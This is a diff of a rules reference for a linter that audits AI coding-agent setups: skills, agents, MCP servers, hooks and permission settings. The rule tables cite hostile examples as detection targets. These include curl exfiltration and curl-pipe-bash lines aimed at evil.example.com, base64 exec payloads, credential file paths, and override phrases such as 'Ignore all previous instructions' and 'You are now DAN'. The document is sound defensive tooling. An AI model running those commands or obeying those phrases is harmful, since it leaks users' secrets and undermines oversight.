@@ -1,6 +1,6 @@
 # Rules Reference
 
-Complete reference for all 108 deterministic lint rules and the LLM-based review system.
+Complete reference for all 99 deterministic lint rules and the LLM-based review system.
 
 ## How rules work
 
@@ -8,7 +8,7 @@ Each rule is a Python class that inspects one component and reports findings. Ru
 
 Severity levels: **error** (broken config, security risk), **warning** (reduces effectiveness), **info** (minor improvement).
 
-All deterministic rules run in the **CLI** (`harness-lint`/`harness-gate`/`harness-security`), **Plugin** (Claude Code / Cursor), and **GitHub Action**. YARA and CVE rules only run in the `security` preset.
+All deterministic rules run in the **CLI** (`harness-lint`/`harness-gate`/`harness-security`), **Plugin** (Claude Code / Cursor), and **GitHub Action**. YARA runs in the security preset; the networked CVE lookup requires `harness-security --cve`.
 
 ### Custom YAML rules
 
@@ -36,7 +36,6 @@ Rules marked exact should be fixed. Heuristic and advisory findings are conversa
 
 **Known false positives:**
 - `command/references-nonexistent-skill` (heuristic): may fire on CLI binary names; the rule skips names appearing after install commands, but suppress if a legitimate mention is flagged.
-- `quality/scope-overreach` (advisory): targets authority claims (e.g. "required for all tasks"); ordinary instructions like "check all files" are not flagged.
 - `security/no-prompt-injection` (heuristic): fires on documentation that quotes injection phrases as examples.
 - `hooks/silent-failure-masking` (heuristic): fires on intentional `|| true` in cleanup steps.
 
@@ -60,14 +59,12 @@ and verified against the registry in CI. Do not edit it by hand.
 | `agent/disallowed-tools-parseable` | advisory | FILE |
 | `agent/excessive-permissions` | advisory | FILE |
 | `agent/memory-write-unscoped` | advisory | FILE |
-| `agent/model-specified` | advisory | FILE |
 | `agent/no-credential-access` | advisory | FILE |
 | `agent/no-prompt-injection` | advisory | FILE |
 | `agent/obfuscation` | advisory | FILE |
 | `agent/referenced-skills-exist` | advisory | PAIRWISE |
 | `agent/reverse-shell` | advisory | FILE |
 | `agent/unbounded-delegation` | advisory | FILE |
-| `claude-md/exists` | advisory | FILE |
 | `claude-md/generic-advice` | advisory | FILE |
 | `claude-md/include-exists` | gating | FILE_FS |
 | `claude-md/skill-duplication` | advisory | PAIRWISE |
@@ -84,21 +81,21 @@ and verified against the registry in CI. Do not edit it by hand.
 | `command/script-exists` | advisory | FILE_FS |
 | `command/shadows-builtin` | advisory | FILE |
 | `command/skill-overlap` | advisory | PAIRWISE |
+| `config/dangerous-autonomy` | gating | FILE |
+| `config/valid-structure` | gating | FILE |
+| `content/activation-valid` | gating | FILE |
 | `content/allowed-tools-auto-approve` | advisory | FILE |
 | `content/broken-references` | advisory | FILE_FS |
 | `content/circular-references` | advisory | SETUP |
 | `content/description-length` | advisory | FILE |
 | `content/duplicate-detection` | advisory | PAIRWISE |
 | `content/hardcoded-machine-path` | gating | FILE |
-| `content/mcp-skill-alignment` | advisory | SETUP |
-| `content/missing-boundary-policy` | advisory | FILE |
-| `content/orphan-skills` | advisory | SETUP |
-| `content/permission-escalation` | advisory | SETUP |
 | `content/token-budget` | advisory | FILE |
-| `content/total-context-budget` | advisory | SETUP |
 | `content/total-description-budget` | advisory | SETUP |
+| `cross/config-component-conflict` | gating | SETUP |
 | `cross/config-instruction-conflict` | advisory | PAIRWISE |
-| `cross/multi-assistant-drift` | gating | PAIRWISE |
+| `cross/duplicate-skill-id` | gating | SETUP |
+| `cross/multi-assistant-drift` | advisory | PAIRWISE |
 | `cross/overpermissive-grants` | gating | FILE |
 | `frontmatter/description-quality` | advisory | FILE |
 | `frontmatter/description-required` | gating | FILE |
@@ -113,8 +110,6 @@ and verified against the registry in CI. Do not edit it by hand.
 | `hooks/local-settings-committed` | gating | FILE_FS |
 | `hooks/matcher-matches-no-tool` | advisory | FILE |
 | `hooks/network-access` | advisory | FILE |
-| `hooks/no-audit-trail` | advisory | FILE |
-| `hooks/no-commit-guard` | advisory | FILE |
 | `hooks/permission-contradiction` | gating | FILE |
 | `hooks/permission-prompt-disabled` | gating | FILE |
 | `hooks/pre-trust-permissions` | advisory | FILE |
@@ -126,8 +121,6 @@ and verified against the registry in CI. Do not edit it by hand.
 | `mcp/endpoint-integrity` | gating | FILE_FS |
 | `mcp/json-duplicate-keys` | gating | FILE |
 | `mcp/no-plaintext-secrets` | advisory | FILE |
-| `mcp/no-wildcard-tools` | advisory | FILE |
-| `mcp/suspicious-endpoint` | advisory | FILE |
 | `mcp/unpinned-package` | gating | FILE |
 | `mcp/valid-config` | gating | FILE |
 | `quality/example-gap` | advisory | FILE |
@@ -135,9 +128,7 @@ and verified against the registry in CI. Do not edit it by hand.
 | `quality/negative-only` | advisory | FILE |
 | `quality/redundant-guidance` | advisory | FILE |
 | `quality/scope-grab-description` | advisory | FILE |
-| `quality/scope-overreach` | advisory | FILE |
 | `quality/stale-references` | advisory | FILE |
-| `quality/trigger-manipulation` | advisory | FILE |
 | `quality/unfinished-content` | advisory | FILE |
 | `security/ast-behavioral` | advisory | FILE |
 | `security/bash-taint-flow` | advisory | FILE |
@@ -147,7 +138,6 @@ and verified against the registry in CI. Do not edit it by hand.
 | `security/cve-lookup` | advisory | FILE |
 | `security/dangerous-permission-grant` | advisory | FILE |
 | `security/data-exfiltration` | advisory | FILE |
-| `security/mcp-least-privilege` | advisory | FILE |
 | `security/mcp-tool-poisoning` | advisory | FILE |
 | `security/memory-write-unscoped` | advisory | FILE |
 | `security/no-credential-access` | advisory | FILE |
@@ -174,24 +164,18 @@ These rules run against every discovered skill. Applies to: CC, CU, CP.
 |------|------|-------------|---------|------------|
 | `structural/skill-md-exists` | structural | Every skill directory must have a SKILL.md file. Without it, the skill won't be discovered or loaded by the AI assistant. | `skills/deploy/` exists but has no `SKILL.md` inside | File existence check |
 | `frontmatter/description-required` | frontmatter | The `description` field must exist in SKILL.md frontmatter. The AI assistant uses this to decide when to load the skill, so without it the skill is invisible. | SKILL.md has `---` frontmatter but no `description:` key | YAML field check |
-| `frontmatter/description-quality` | frontmatter | The description should clearly explain when to use the skill. Vague descriptions cause the AI to load the wrong skill or miss it entirely. | `"Helps with code"` triggers on everything; `"Use when formatting Python with black, line-length 100"` is specific | Heuristic string analysis |
-| `frontmatter/format-valid` | frontmatter | Frontmatter must be valid YAML with correct types. Malformed YAML means the skill metadata can't be parsed. | `description: true` instead of a string, or invalid YAML syntax | YAML parsing + type checks |
+| `frontmatter/description-quality` | frontmatter | Enforces the portable Agent Skills 1,024-character description limit. Semantic routing quality is handled by LLM review. | A description longer than 1,024 characters | Length check |
+| `frontmatter/format-valid` | frontmatter | Validates portable Agent Skills frontmatter: required name/description, name syntax and directory match, compatibility, metadata, and experimental allowed-tools types. | `name: Wrong_Name` or `metadata` with non-string values | YAML parsing + Agent Skills schema checks |
 | `content/duplicate-detection` | content | Finds skills that are near-copies of each other. Duplicates waste context window space and can cause conflicting behavior. | Two skills both explaining "how to write tests" with 85% text overlap | TF-IDF cosine similarity |
 | `content/broken-references` | content | File paths mentioned in the skill body must actually exist on disk. Advisory (not a gate): extracting path-shaped strings from prose is not a filesystem fact. Backtick paths after `e.g.` / `for example` are ignored; a real path before those markers is still checked. | Skill says `See scripts/deploy.sh` but that file was deleted | Path resolution + existence check |
 | `content/circular-references` | content | Catches reference loops between skills. Circular references waste context and can confuse the AI into loading an infinite chain. | Skill A says "see skill B", skill B says "see skill A" | Graph cycle detection |
 | `content/token-budget` | content | Skills should stay under ~3000 tokens and 500 lines. Oversized skills eat up the context window, leaving less room for the actual conversation. | A 6000-token skill with a lot of boilerplate that could be trimmed or split | Token counting (tiktoken) |
-| `content/orphan-skills` | content | Skills that nothing references (no command, no CLAUDE.md, no agent) may be dead weight. They could be loaded unnecessarily or never loaded at all. | A skill exists but is never mentioned anywhere in the project | Reference graph search |
-| `content/mcp-skill-alignment` | content | When any component that can consume an MCP server (a skill, command, subagent, or root context file such as CLAUDE.md) references MCP tools, the corresponding MCP server should be configured. Misalignment means the tool calls will fail at runtime. A server's own name counts as a reference. | A skill uses `mcp__github__search` but `.mcp.json` has no `github` server | Cross-file reference matching |
-| `content/total-context-budget` | content | The total tokens across all skills should not exceed a reasonable share of the context window. Too many skills crowd out the actual conversation. | 50 skills totaling 200K tokens when the context window is 128K | Aggregate token counting |
-| `content/permission-escalation` | content | A skill should not silently gain dangerous capabilities by invoking another skill that has them. This creates hidden privilege chains. | Skill A (read-only) invokes skill B (has network + shell access), so A effectively gains those too | Reference graph + capability detection |
 | `quality/imprecise-instruction` | quality | Instructions should be direct and clear. Hedging language ("try to", "consider", "you might want to") makes the AI unsure what to do. | `"Try to use descriptive variable names"` instead of `"Use descriptive variable names"` | Pattern matching (hedging phrases) |
 | `quality/redundant-guidance` | quality | Instructions that restate what the AI already does by default waste tokens. Every token spent on obvious advice is a token not spent on project-specific context. | `"Always write clean, readable code"` or `"Handle errors properly"` | Pattern matching (known defaults) |
 | `quality/unfinished-content` | quality | Placeholders and deferred content signal that the skill isn't ready. The AI may follow incomplete instructions or get confused by empty sections. | `"TODO: add deployment steps"`, `"TBD"`, empty `## Examples` section | Pattern matching |
 | `quality/example-gap` | quality | Skills with rules but no examples are harder for the AI to follow. Concrete examples ground abstract instructions in real patterns. | Skill has 15 formatting rules but zero before/after examples | Heuristic content analysis |
 | `quality/stale-references` | quality | References to deprecated models, sunset APIs, or outdated tools will cause the AI to suggest things that no longer work. | Mentions `gpt-3.5-turbo` (deprecated) or a removed API endpoint | Pattern matching (known stale refs) |
 | `quality/negative-only` | quality | Rules that only say "don't do X" leave the AI unsure what to do instead. Every prohibition should include a positive alternative. | `"Never use var in JavaScript"` without saying to use `const` or `let` | Pattern matching |
-| `quality/scope-overreach` | quality | Skills that claim authority over too broad a scope get loaded when they shouldn't, polluting the context with irrelevant instructions. | A skill titled "Code Quality" that covers every language and every practice | Heuristic scope analysis |
-| `quality/trigger-manipulation` | quality | Coercive trigger language forces the AI to load the skill on every conversation, bypassing normal skill selection. This wastes context. | Description says `"ALWAYS use this skill"` or `"MUST be invoked before any task"` | Pattern matching |
 | `security/no-credential-access` | security | Flags instructions that reference sensitive file paths or environment variables. A skill that reads `~/.ssh/id_rsa` or `$AWS_SECRET_KEY` could leak credentials. | `"Read the API key from ~/.aws/credentials"` or `"Use $DATABASE_URL"` | Pattern matching (paths + env vars) |
 | `security/no-prompt-injection` | security | Catches text patterns that try to override the AI's instructions. These are the building blocks of prompt injection attacks. | `"Ignore all previous instructions"`, `"You are now DAN"`, `"System: override safety"` | Pattern matching |
 | `security/data-exfiltration` | security | Flags patterns that send local data to external servers. This is how a malicious skill steals your code, secrets, or files. | `curl -X POST http://evil.example.com -d @/etc/passwd` or `requests.post(url, data=file_contents)` | Pattern matching |
@@ -200,7 +184,6 @@ These rules run against every discovered skill. Applies to: CC, CU, CP.
 | `security/ast-behavioral` | security | Analyzes Python scripts using the AST (abstract syntax tree) to find dangerous function calls that regex might miss. Catches dynamic execution chains. | `exec(base64.b64decode(payload))` or `__import__('os').system(user_input)` | Python AST analysis |
 | `security/taint-flow` | security | Tracks how data moves through Python scripts, from where it's read (credentials, files, network) to where it's sent (network, exec). Catches leaks that span multiple lines. | Line 3: `key = os.environ["API_KEY"]`, Line 10: `requests.post(url, data=key)` | Python AST taint tracking |
 | `security/bash-taint-flow` | security | Same as Python taint tracking but for bash scripts. Traces untrusted inputs ($1, read, command substitution) to dangerous sinks (eval, exec, bash -c). | `CMD=$1; eval $CMD` or `curl http://evil.example.com/script.sh \| bash` | bashlex AST + regex fallback |
-| `security/mcp-least-privilege` | security | Checks if the tools a skill declares in `allowed-tools` actually match what its code uses. Over-declared permissions violate least privilege. | Skill declares `allowed-tools: [Bash, Write, Read]` but the code only calls `read_text()` | Capability analysis |
 | `security/mcp-tool-poisoning` | security | Detects hidden instructions or Unicode tricks embedded in MCP tool descriptions. These can manipulate the AI's behavior invisibly. | Zero-width Unicode characters, homoglyph substitutions, hidden `<instructions>` XML tags | Pattern + Unicode analysis |
 | `content/allowed-tools-auto-approve` | content | Flags `allowed-tools` entries that auto-approve dangerous tools. `allowed-tools` removes the human confirmation prompt (auto-approve), not adds a sandbox. Bash and `Bash(...)` are high-risk; Write, Edit, NotebookEdit are medium-risk. | `allowed-tools: [Bash, Write]` in SKILL.md frontmatter | Allowlist matching |
 | `content/description-length` | content | Flags skill descriptions over 100 tokens. Descriptions load into the system prompt every session, invoked or not. Shows approximate count when tiktoken is unavailable. | A 150-token description that could be trimmed to 60 | Token counting |
@@ -222,7 +205,6 @@ These rules run against every discovered agent definition. Applies to: CC, CP, O
 | Rule | Type | What it does | Example | Built with |
 |------|------|-------------|---------|------------|
 | `agent/description-required` | structural | Agent must have a `description` field in frontmatter. Without it, the agent can't be listed or selected properly. | Agent `.md` file has frontmatter but no `description:` | YAML field check |
-| `agent/model-specified` | structural | Agent should declare which model to use. Without it, behavior varies depending on the user's default model setting. | No `model:` field in agent frontmatter | YAML field check |
 | `agent/referenced-skills-exist` | structural | Every skill listed in the agent's frontmatter must have a matching SKILL.md on disk. Missing skills cause the agent to fail when it tries to use them. | Agent lists `skills: [deploy, test]` but `skills/deploy/SKILL.md` doesn't exist | File existence check |
 | `agent/disallowed-tools-parseable` | structural | Each entry in `disallowedTools` must follow the expected format (`ToolName` or `ToolName(pattern)`). Unparseable entries are silently ignored, leaving the tool unrestricted. | `disallowedTools: "not a valid format"` | Format validation |
 | `agent/constraint-body-match` | quality | When the agent body says "never use Bash", there should be a matching `disallowedTools: Bash` entry. Verbal-only constraints are not enforced by the runtime. | Body says "Do not use the Bash tool" but `disallowedTools` doesn't list Bash | Body-to-frontmatter cross-check |
@@ -261,10 +243,8 @@ These rules run against the project's root system instruction file. Applies to: 
 
 | Rule | Type | What it does | Example | Built with |
 |------|------|-------------|---------|------------|
-| `claude-md/exists` | structural | The project should have a system instruction file. Without it, the AI has no project-specific context and relies entirely on defaults. | Project has skills and commands but no CLAUDE.md, GEMINI.md, AGENTS.md, or .cursorrules | File existence check |
 | `claude-md/skill-duplication` | content | System instructions should not repeat what's already in a skill. Duplicated content wastes tokens every session (system instructions are always loaded, skills are on-demand). | CLAUDE.md has a "Testing" section that's 80% identical to the `testing` skill | TF-IDF similarity |
 | `claude-md/generic-advice` | quality | System instructions should not contain advice the AI already follows by default. Generic advice wastes tokens without changing behavior. | `"Write clean, readable code"`, `"Use descriptive variable names"`, `"Handle errors properly"` | Pattern matching |
-| `content/missing-boundary-policy` | content | Flags instruction files that define no directory or resource boundaries. Without scope limits, the agent operates with no declared constraints on which files or systems it can access. | CLAUDE.md with coding style rules but no "off-limits" or "do not access" directives | Pattern matching |
 
 ## MCP configuration (.mcp.json, .cursor/mcp.json, .vscode/mcp.json)
 
@@ -273,8 +253,6 @@ These rules run against MCP server configuration files. Applies to: CC, CU.
 | Rule | Type | What it does | Example | Built with |
 |------|------|-------------|---------|------------|
 | `mcp/valid-config` | structural | The `.mcp.json` file must have valid structure with the expected fields and types. Malformed config means MCP servers won't connect. | Missing `mcpServers` key, or `command` field is a number instead of a string | JSON schema validation |
-| `mcp/suspicious-endpoint` | security | Flags MCP servers pointing to private IP addresses. These often indicate development configs accidentally left in a shared project. (Loopback hosts are covered by `mcp/endpoint-integrity`.) | `http://192.168.1.1:8080` as an MCP server URL | Pattern matching (IP ranges) |
-| `mcp/no-wildcard-tools` | security | Flags MCP servers that expose all their tools without restriction. Least privilege means only exposing the tools the project actually needs. | An MCP server with no `allowedTools` filter, granting access to every tool it offers | Config field check |
 | `mcp/no-plaintext-secrets` | security | Flags MCP server configs that contain plaintext secrets (API keys, tokens, passwords) in `env` or `args`. Secrets should come from environment variables or secret managers, not be hardcoded. | `"env": {"API_KEY": "sk-abc123..."}` in `.mcp.json` | Regex pattern matching (known secret prefixes) |
 | `mcp/unpinned-package` | security | Flags MCP servers installed via `npx -y` or `@latest` without version pinning. Unpinned packages pull whatever version is current, which could include malicious updates. | `"command": "npx -y @modelcontextprotocol/server-github"` without a version pin | Package reference parsing |
 | `mcp/auto-approve-risk` | security | Flags MCP server configs that use `autoApprove` to bypass the user confirmation prompt for specific tools. Auto-approved tools execute without human review. | `"autoApprove": ["read_file", "write_file"]` in an MCP server config | Config field check |
@@ -296,9 +274,7 @@ These rules run against hook definitions. Applies to: CC, CU.
 | `hooks/api-key-helper` | security | Flags project-scoped settings defining `apiKeyHelper`. A repo-controlled helper can intercept or exfiltrate API keys during resolution. | `"apiKeyHelper": "scripts/get-key.sh"` in project settings | JSON key check |
 | `hooks/env-credential-override` | security | Flags project-scoped settings that set credential-shaped environment variables (`_KEY`, `_TOKEN`, `_SECRET`, `_PASSWORD`, `_KEY_ID`, `_PAT`). Excludes `_PUBLIC_KEY`. A cloned repo should not control credential values. | `"env": {"GITHUB_API_KEY": "ghp_abc123"}` in project settings | Regex suffix matching |
 | `hooks/pre-trust-permissions` | security | Flags project-scoped settings with `permissions.allow` entries or lifecycle hooks (`SessionStart`, `Stop`, etc.) that auto-execute without user interaction. CVE-2025-59536 and GHSA-ph6w-f82w-28w6 exploited this. `PreToolUse`/`PostToolUse` hooks are not flagged since they only run during active interaction. | `"permissions": {"allow": ["Bash(*)"]}` or `"hooks": {"SessionStart": [...]}` in project settings | JSON key + lifecycle event check |
-| `hooks/no-commit-guard` | security | Flags settings with hooks but no PreToolUse hook guarding git commit. A commit guard can scan staged changes for secrets before they reach the repository. | Settings with `PreToolUse` hooks but no matcher for `git commit` | JSON key + matcher analysis |
 | `security/dangerous-permission-grant` | security | Flags `permissions.allow` entries that auto-approve destructive, privilege-escalating, or persistence-creating patterns. Goes beyond breadth (Bash(*)) to check depth (sudo, shred, curl\|bash, terraform destroy, crontab, etc.). | `"permissions": {"allow": ["Bash(sudo apt install *)"]}` | Regex pattern matching on allow entries |
-| `hooks/no-audit-trail` | content | Flags settings with no observability or telemetry configuration. Enterprise environments benefit from logging agent activity for audit and incident response. | Settings with no OTEL or logging env vars | JSON env key check |
 
 ## Cross-component rules
 
@@ -306,7 +282,12 @@ These rules analyze relationships between multiple components. They run once per
 
 | Rule | Type | What it does | Example | Built with |
 |------|------|-------------|---------|------------|
-| `security/cross-component-flow` | security | Builds a graph of all components and traces data flows across boundaries. Edges are created only from explicit invocation constructs (slash commands, `skill:`/`command:` declarations, imperative verbs with marked targets), not from plain-text mentions or CLI flags. Catches three things: (1) **exfiltration chains** where one skill reads credentials and invokes another with network access; (2) **confused deputy attacks** where an agent disallows a tool but delegates to a skill that has the equivalent capability; (3) **phantom MCP calls** where a skill references an MCP server that isn't configured. | Skill A has `os.environ.get("API_KEY")` in its scripts and says "invoke `/uploader`"; skill B has `requests.post()` in its scripts. The credentials could flow from A to B and out to the network. | Component graph + capability analysis |
+| `security/cross-component-flow` | security | Uses parser-backed graph edges to flag explicit credential-to-network/MCP paths and MCP tool calls whose server is absent. Inferred prose mentions are excluded. | A credential-reading skill explicitly invokes a network-capable skill or configured MCP server | Component graph + capability analysis |
+| `config/valid-structure` | structural | Validates current Codex, Gemini CLI, OpenCode V2, and Copilot settings shapes. | OpenCode permission missing `resource` or using an invalid `effect` | JSON/JSONC/TOML parsing + client schemas |
+| `config/dangerous-autonomy` | security | Flags explicit project settings that remove both approval and containment, or broadly trust high-impact capabilities. | Codex `approval_policy="never"` with `sandbox_mode="danger-full-access"` | Client-specific config analysis |
+| `content/activation-valid` | structural | Validates activation metadata required by path-scoped instructions. | Copilot `.instructions.md` without `applyTo` | Frontmatter check |
+| `cross/config-component-conflict` | cross_component | Finds discovered components made unreachable by the same setup's settings. | OpenCode permission denies a present skill; Gemini excludes a configured MCP server | Config-to-component comparison |
+| `cross/duplicate-skill-id` | cross_component | Flags one skill ID resolving to divergent SKILL.md bodies across discovery roots. | `.agents/skills/review` and `.codex/skills/review` contain different instructions | Setup-wide identity comparison |
 | `cross/overpermissive-grants` | security | Flags `permissions.allow` entries in settings.json (and settings.local.json) that pre-approve arbitrary command execution: `Bash(*)`, bare tool names like `Bash` or `Edit`, and wildcard grants on commands that run arbitrary code (`awk`, `sed`, `find`, `python`, `perl`, `node`, `npx`, `xargs`, `env`, `docker`, `curl`, and others). A short prefix is not itself reported: `Bash(git:*)` is silent, `Bash(awk:*)` is not. | `permissions.allow` contains `Bash(python:*)`, which is `python -c anything` behind a scoped-looking entry | Explicit arbitrary-execution command list |
 | `hooks/permission-contradiction` | cross_component | Flags a `permissions.allow` entry that a `permissions.deny` entry also matches. Deny wins, so the allow is dead configuration and the author's mental model of what is permitted is wrong. | `allow: ["Bash(git commit:*)"]` with `deny: ["Bash(git:*)"]` | Grant pattern containment |
 | `hooks/permission-prompt-disabled` | security | Flags committed settings that remove the human from the loop for every user of the repository: `permissions.defaultMode` set to `bypassPermissions`, `dontAsk`, or `acceptEdits`; `enableAllProjectMcpServers: true`; `skipDangerousModePermissionPrompt: true`. | `{"permissions": {"defaultMode": "bypassPermissions"}}` in project `settings.json` | Key presence |
@@ -336,7 +317,7 @@ In CLI mode, review requires an API key (Gemini or Anthropic). In Claude Code pl
 | Component | Category | What the LLM checks |
 |-----------|----------|---------------------|
 | Skill | specificity | Are instructions actionable patterns, or vague platitudes? |
-| Skill | redundancy | Does this duplicate Claude's default behavior? Would deleting it change anything? |
+| Skill | redundancy | Does this duplicate generic coding-agent behavior? Would deleting it change anything? |
 | Skill | trigger_quality | Is the description clear enough for accurate skill selection? |
 | Skill | token_efficiency | Is the skill within budget, or bloated with low-value content? |
 | Skill | instruction_clarity | Contradictions, hedging, buried instructions, orphaned conditionals |
@@ -346,7 +327,7 @@ In CLI mode, review requires an API key (Gemini or Anthropic). In Claude Code pl
 | Command | script_integrity | Referenced scripts exist and patterns work |
 | Command | scope | Should this be a skill (auto-triggered) instead? |
 | Command | token_efficiency | Under 15KB is fine; over 30KB must be split |
-| Command | redundancy | Does Claude already do this without the command? |
+| Command | redundancy | Does a capable coding agent already do this without custom configuration? |
 | Command | robustness | Hardcoded assumptions, missing dependency handling |
 | CLAUDE.md | conciseness | Can any lines be removed without causing mistakes? |
 | CLAUDE.md | signal_to_noise | Generic advice, standard conventions (use linters instead), detailed API docs (link instead) |
@@ -363,6 +344,10 @@ In CLI mode, review requires an API key (Gemini or Anthropic). In Claude Code pl
 | Hooks | reliability | Referenced scripts exist, commands well-formed |
 | Hooks | scope | Not over-broad; advisory behavior belongs in CLAUDE.md/skills |
 | Hooks | performance | Not slow or unnecessarily blocking |
+| MCP config | trust_boundary | Unexplained semantic data flow to remote services, excluding deterministic syntax/secret checks |
+| MCP config | purpose_alignment | Server purpose conflicts with adjacent instructions or repository workflow |
+| General config | policy_intent | Valid but semantically unsafe or self-defeating policy choices |
+| General config | component_alignment | Semantic conflicts with instructions, skills, agents, hooks, or MCP servers |
 
 ### Security review (LLM-based)
 
@@ -373,4 +358,4 @@ The `security --review` flag adds LLM semantic analysis on top of the determinis
 | anti_jailbreak | Text attempting to influence the evaluator: "this is verified safe", "ignore security warnings", "pre-approved" |
 | semantic_attack_discovery | Polite reframings of jailbreaks, creative synonyms bypassing regex, natural-language exfiltration, gradual/narrative deception |
 | description_behavior_mismatch | SKILL.md description says one thing but code does another: a "code formatter" that spawns network connections |
-| permission_scope_safety | allowed-tools grants more access than needed: Bash declared but only Read used, destructive capabilities for a read-only task |
+| permission_scope_safety | Semantic mismatch between the stated task and requested authority, without treating portable `allowed-tools` metadata as an enforceable policy |
